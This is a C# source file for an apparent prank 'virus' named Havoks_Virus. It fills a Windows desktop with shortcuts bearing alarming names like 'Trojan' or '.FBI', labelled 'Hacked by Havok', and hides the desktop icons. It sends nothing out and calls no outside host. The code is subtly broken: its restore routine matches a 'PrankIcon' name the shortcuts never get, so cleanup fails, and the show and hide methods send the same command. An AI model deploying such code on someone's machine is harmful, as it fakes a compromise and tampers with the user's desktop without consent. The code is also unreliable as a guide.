using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using IWshRuntimeLibrary;

namespace Havoks_Virus
{
    public class DtIcon
    {
        private string mediaPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Media");
        private string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        private string iconFileName = "spin.ico"; // Assuming the icon is named spin.ico and located in the project's Media directory

        // DLL Imports
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "SendMessageA", SetLastError = true)]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_COMMAND = 0x111;
        private const int MIN_ALL = 419; // Command to hide icons
        private const int MIN_ALL_UNDO = 416; // Command to show icons

        // Generate a unique random name for prank icon
        private string GenerateRandomName()
        {
            Random rnd = new Random();
            string[] prefixes = { "Havok", "Delfos", "Chaos", "Pandora", "Anarchy", "Pepe", "Cat", "Jad", "Kelsie", "LuLu", "Jariff", "Stetson", "Skeeter", "getajob", "Get_a_Job", "NSA", "Harley", "dirty" }; // Prefixes for the names
            string[] suffixes = { ".A", ".B", ".C", ".D", ".E", "Virus", "Bug", "Trojan", ".wm", "worm", ".exe", ".elf", ".FBI", ".CIA", ".NSA", ".PA", ".CA", ".NYC", "Virus", "Virii" }; // Suffixes for the names

            string prefix = prefixes[rnd.Next(prefixes.Length)];
            string suffix = suffixes[rnd.Next(suffixes.Length)];
            return prefix + suffix;
        }

        public void CreatePrankIcons()
        {
            string iconPath = Path.Combine(mediaPath, iconFileName);
            if (!System.IO.File.Exists(iconPath)) // Specify System.IO to resolve ambiguity
            {
                throw new FileNotFoundException("Icon file not found.", iconPath);
            }

            WshShell shell = new WshShell();
            string executablePath = Application.ExecutablePath;
            for (int i = 0; i < 10; i++)    // Adjust the number of icons as needed
            {
                string prankName = GenerateRandomName();
                string linkPath = Path.Combine(desktopPath, prankName + ".lnk");
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(linkPath);
                shortcut.Description = "Hacked by Havok"; // Change as needed
                shortcut.IconLocation = iconPath;  // Ensure this points to an .ico file
                shortcut.TargetPath = executablePath;                          //"C:\\Windows\\System32\\notepad.exe"; // Point to a benign or dummy target for the shortcut
                shortcut.Save();
            }
        }

        public void RestoreDesktop()
        {
            var prankFiles = Directory.GetFiles(desktopPath, "*.lnk");
            foreach (var prankFile in prankFiles)
            {
                if (prankFile.Contains("PrankIcon"))
                {
                    System.IO.File.Delete(prankFile);
                }
            }
        }

        public void HideDesktopIcons()
        {
            IntPtr hWnd = FindWindow("Progman", "Program Manager");
            if (hWnd != IntPtr.Zero)
            {
                // 0x7402 is specific to hiding desktop icons
                SendMessage(hWnd, WM_COMMAND, new IntPtr(0x7402), IntPtr.Zero);
            }
        }

        public void ShowDesktopIcons()
        {
            IntPtr hWnd = FindWindow("Progman", "Program Manager");
            if (hWnd != IntPtr.Zero)
            {
                // Specific command to show desktop icons might vary, ensure it's correct
                SendMessage(hWnd, WM_COMMAND, new IntPtr(0x7402), IntPtr.Zero);
            }
        }
    }
}